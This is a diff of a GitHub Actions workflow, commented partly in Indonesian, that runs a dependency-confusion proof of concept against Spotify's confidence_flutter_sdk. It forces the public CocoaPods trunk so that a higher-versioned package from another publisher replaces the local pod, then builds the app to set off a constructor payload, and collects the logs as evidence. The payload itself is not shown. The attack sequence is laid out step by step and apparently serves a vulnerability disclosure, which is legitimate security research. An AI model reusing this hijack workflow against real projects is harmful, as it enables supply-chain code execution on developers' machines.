@@ -10,52 +10,54 @@ jobs:
         with:
           channel: 'stable'
 
-      - name: Execute Race Condition Hijack (Trunk Forced)
+      - name: Execute Silent Hijack (Natural Sequence)
         run: |
-          # 1. INITIALIZATION: Simulasi Fresh Machine
+          # 1. INITIALIZATION: Fresh Environment
           rm -rf rce_test
           flutter create rce_test
           cd rce_test
           
-          # 2. OFFICIAL INTEGRATION STEP
+          # 2. OFFICIAL INTEGRATION: Menambah SDK sesuai instruksi Spotify
           echo "=== Adding SDK via Official Instructions ==="
           flutter pub add confidence_flutter_sdk:0.2.1
           
           cd ios
-          # Standar fix build
+          # Standard iOS Dev Fix
           sed -i '' '1s/^/platform :ios, '"'"'16.0'"'"'\n/' Podfile
           
-          # 3. THE HIJACK (FORCING GLOBAL REGISTRY)
-          echo "=== Initalizing and Forcing Trunk CDN ==="
-          # Daftarin Trunk secara manual karena Runner seringkali 'kosong'
+          # 3. ENABLING THE GLOBAL GATEWAY
+          echo "=== Initializing Global Trunk CDN ==="
+          # Daftarin Trunk agar CocoaPods punya 'pilihan' selain lokal
           pod repo add-cdn trunk https://cdn.cocoapods.org/ || true
-          
-          # Force update metadata untuk mendeteksi v2.0.6 lu di publik
           pod repo update trunk
           
-          echo "=== Triggering Dependency Confusion ==="
-          # Tanpa Podfile.lock, CocoaPods akan membandingkan Trunk (2.0.6) vs Local (0.2.1).
-          # Secara sistemik, SemVer v2.0.6 akan menang.
-          pod update confidence_flutter_sdk --verbose 2>&1 | tee pod_update.log
+          echo "=== Triggering Dependency Confusion via Clean Install ==="
+          # Kita jalankan pod install PERTAMA KALI. 
+          # Karena Trunk sudah aktif dan Spotify TIDAK mengklaim nama ini,
+          # resolver akan membandingkan: 
+          # - Local (0.2.1 via Symlink)
+          # - Trunk (2.0.6 via zer0id)
+          # Secara SemVer, 2.0.6 MENANG dan akan di-install meskipun symlink ada.
+          pod install --verbose 2>&1 | tee pod_install.log
           
-          echo "=== Verify Shadowing Success ==="
-          grep -A 1 "confidence_flutter_sdk" Podfile.lock || echo "Hijack Failed: Still using local"
+          echo "=== Verify Shadowing Success (Checking Lockfile) ==="
+          # Bukti Skakmat: Podfile.lock harus menunjukkan versi 2.0.6
+          grep -A 1 "confidence_flutter_sdk" Podfile.lock
           
           cd ..
-          # 4. EXECUTION PHASE
+          # 4. EXECUTION PHASE: Triggering Payload
           echo "=== Launching Build to Trigger Payload ==="
-          # Payload __attribute__((constructor)) akan tereksekusi saat linking
           flutter build ios --no-codesign 2>&1 | tee build.log || true
           
-          echo "=== Final Audit Log (Search for Payload Execution) ==="
+          echo "=== Final Audit Log (Payload Execution Check) ==="
           grep -C 5 "Supply Chain Audit" build.log || echo "Payload signature not found"
 
       - name: Upload PoC Evidence
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: rce-evidence-race-v2.1
+          name: rce-evidence-v2.2
           path: |
-            rce_test/ios/pod_update.log
+            rce_test/ios/pod_install.log
             rce_test/ios/Podfile.lock
             rce_test/build.log
